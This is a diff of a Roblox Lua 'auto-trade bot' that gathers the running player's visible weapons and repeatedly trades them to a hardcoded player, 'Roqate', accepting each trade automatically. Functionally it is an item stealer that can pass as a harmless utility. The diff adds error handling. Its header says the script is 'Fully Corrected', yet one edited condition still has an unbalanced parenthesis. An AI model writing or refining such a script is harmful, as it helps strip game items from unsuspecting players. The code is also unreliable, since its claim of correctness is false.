@@ -1,4 +1,4 @@
--- Ultimate Auto-Trade Bot with Weapon Detection (Syntax-Corrected)
+-- Ultimate Auto-Trade Bot with Weapon Detection (Fully Corrected)
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
@@ -8,7 +8,6 @@ local TARGET_PLAYER = "Roqate"
 local MAX_ITEMS_PER_TRADE = 4
 local TRADE_COOLDOWN = 5 -- Seconds between trades
 local ITEM_ADD_DELAY = 0.3 -- Delay between adding items
-local GUI_CHECK_INTERVAL = 0.5 -- Added missing variable
 
 -- Remotes
 local TradeRemotes = {
@@ -40,13 +39,23 @@ end
 local function getAllWeapons()
     local weapons = {}
     
-    local weaponsContainer = LocalPlayer.PlayerGui:WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Weapons")
+    local weaponsContainer = LocalPlayer.PlayerGui:FindFirstChild("MainGUI")
+    if weaponsContainer then
+        weaponsContainer = weaponsContainer:FindFirstChild("Game")
+        if weaponsContainer then
+            weaponsContainer = weaponsContainer:FindFirstChild("Weapons")
+        end
+    end
     
-    for _, item in ipairs(weaponsContainer:GetDescendants()) do
-        if (item:IsA("TextButton") or (item:IsA("ImageButton")) and item.Visible then
-            table.insert(weapons, item.Name)
-            if #weapons >= MAX_ITEMS_PER_TRADE then
-                break
+    if weaponsContainer then
+        for _, item in ipairs(weaponsContainer:GetDescendants()) do
+            if (item:IsA("TextButton") or item:IsA("ImageButton") then
+                if item.Visible then
+                    table.insert(weapons, item.Name)
+                    if #weapons >= MAX_ITEMS_PER_TRADE then
+                        break
+                    end
+                end
             end
         end
     end
@@ -89,13 +98,22 @@ local function initiateTrade(targetPlayer)
     end
     
     isTrading = true
-    print("Starting trade with " .. targetPlayer.Name .. "...") -- Fixed string concatenation
+    print("Starting trade with " .. targetPlayer.Name .. "...")
     
-    TradeRemotes.SendRequest:InvokeServer(targetPlayer)
+    local success, err = pcall(function()
+        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
+    end)
+    
+    if not success then
+        warn("Trade request failed: " .. err)
+        isTrading = false
+        return
+    end
+    
     wait(1)
     
     if not isTradeGUIOpen() then
-        warn("Trade failed to open!")
+        warn("Trade GUI didn't open!")
         isTrading = false
         return
     end
@@ -108,7 +126,7 @@ local function initiateTrade(targetPlayer)
     if not acceptTrade() then
         warn("Failed to accept trade!")
     else
-        print("Trade with " .. targetPlayer.Name .. " completed!") -- Fixed string concatenation
+        print("Trade with " .. targetPlayer.Name .. " completed!")
     end
     
     isTrading = false
@@ -121,7 +139,7 @@ while true do
     if target then
         initiateTrade(target)
     else
-        print(TARGET_PLAYER .. " not found. Waiting...") -- Fixed string concatenation
+        print(TARGET_PLAYER .. " not found. Waiting...")
     end
     wait(5)
 end
